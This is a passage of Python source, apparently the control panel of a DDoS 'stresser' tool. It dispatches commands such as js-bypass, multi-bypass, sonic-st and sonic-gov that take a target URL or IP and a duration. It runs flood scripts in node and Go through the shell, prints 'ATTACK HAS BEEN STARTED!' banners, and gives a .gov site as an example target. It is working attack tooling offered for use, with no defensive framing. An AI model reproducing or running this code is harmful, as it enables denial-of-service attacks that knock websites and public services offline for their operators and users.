                url = cnc.split()[1]
                time = cnc.split()[2]
                Screen.wrapper(mthd)
                subprocess.run([f'screen -dm node ./core/sonic.js {url} {time}'], shell=True)
                os.system("cls" if os.name == "nt" else "clear")
                print(f"""
\033[36m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[37m╔═╗╔═╗╔╗╔╔╦╗
\033[36m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗ \033[37m╚═╗║╣ ║║║ ║
\033[36m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩ \033[37m╚═╝╚═╝╝╚╝ ╩
\033[36m                            ATTACK HAS BEEN STARTED!
\033[36m                ╚╦════════════════════════════════════════════╦╝
\033[36m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[37m                   TARGET   : [ {url} ]
\033[37m                   TIME     : [ {time} ]
 \033[37m                  METHOD   : [ KILLER ]
 \033[37m                  FPS      : [ -1 UNLIMITED ]
 \033[37m                  COOLDOWN : [ 0 ]
 \033[37m                  VIP      : [ \033[32mTrue\033[37m ]
\033[37m                   USER     : [ root ]
\033[36m           ╚════════════════════════════════════════════════════════╝

""")
            except IndexError:
                print("Usage: sonic-killer <url> <time>")
                print("Example: sonic-killer http://example.com 10")

        elif "js-bypass" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                Screen.wrapper(mthd)
                subprocess.run([f'screen -dm node ./core/HTTP-BYPASS.js {url} {time}'], shell=True)
                os.system("cls" if os.name == "nt" else "clear")
                print(f"""
\033[36m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[37m╔═╗╔═╗╔╗╔╔╦╗
\033[36m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗ \033[37m╚═╗║╣ ║║║ ║
\033[36m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩ \033[37m╚═╝╚═╝╝╚╝ ╩
\033[36m                            ATTACK HAS BEEN STARTED!
\033[36m                ╚╦════════════════════════════════════════════╦╝
\033[36m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[37m                 TARGET   : [ {url} ]
 \033[37m                  TIME     : [ {time} ]
\033[37m                   METHOD   : [ JS-BYPASS ]
 \033[37m                  FPS      : [ -1 UNLIMITED ]
 \033[37m                  COOLDOWN : [ 0 ]
\033[37m                   VIP      : [ \033[32mTrue\033[37m ]
 \033[37m                  USER     : [ root ]
\033[36m           ╚════════════════════════════════════════════════════════╝

""")
            except IndexError:
                print('Usage: js-bypass <url> <time>')
                print('Example: js-bypass http://example.com 20')

        elif "multi-bypass" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                Screen.wrapper(mthd)
                subprocess.run([f'screen -dm node ./core/HTTP-BYPASS.js {url} {time}'], shell=True)
                os.system("cls" if os.name == "nt" else "clear")
                print(f"""
\033[36m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[37m╔═╗╔═╗╔╗╔╔╦╗
\033[36m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗ \033[37m╚═╗║╣ ║║║ ║
\033[36m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩ \033[37m╚═╝╚═╝╝╚╝ ╩
\033[36m                            ATTACK HAS BEEN STARTED!
\033[36m                ╚╦════════════════════════════════════════════╦╝
\033[36m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[37m                 TARGET   : [ {url} ]
 \033[37m                  TIME     : [ {time} ]
\033[37m                   METHOD   : [ MULTI-BYPASS ]
 \033[37m                  FPS      : [ -1 UNLIMITED ]
 \033[37m                  COOLDOWN : [ 0 ]
\033[37m                   VIP      : [ \033[32mTrue\033[37m ]
 \033[37m                  USER     : [ root ]
\033[36m           ╚════════════════════════════════════════════════════════╝

""")
            except IndexError:
                print('Usage: multi-bypass <url> <time>')
                print('Example: multi-bypass http://example.com 20')

        elif "sonic-st" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                out = cnc.split()[4]
                os.system(f'go run ./core/stress.go {ip} {port} 3 2250 {time} {out}')
            except IndexError:
                print('Usage: sonic-st <ip> <port> <seconds> <timeout>')
                print('Example: sonic-st 1.1.1.1 80 60 5')

        elif "sonic-gov" in cnc:
            try:
                url = cnc.split()[1]
                thrd = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'go run ./core/ddos.go {url} {thrd} post {time} header.txt')
            except IndexError:
                print('Usage: sonic-gov <ip> <thread> <time>')
                print('Example: sonic-gov http://example.gov 200 60 ')
                

        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass

#LOGIN

def login():
    user = "1"
    passwd = "1"
    print(f'''
\033[36m╦   ╔═╗ ╔═╗ ╦ ╔╗╔
\033[36m║   ║ ║ ║═╗ ║ ║║║
\033[36m╩═╝ ╚═╝ ╚═╝ ╩ ╝╚╝
            ''')
    username = input("\033[36m</> Username: ")
    password = getpass.getpass(prompt='</> Password: ')
    if username != user or password != passwd:
        print("")
        print("\033[36m</> Invalid credentials! Abandoning...")
        sys.exit(1)
    elif username == user and password == passwd:
        p()

login()
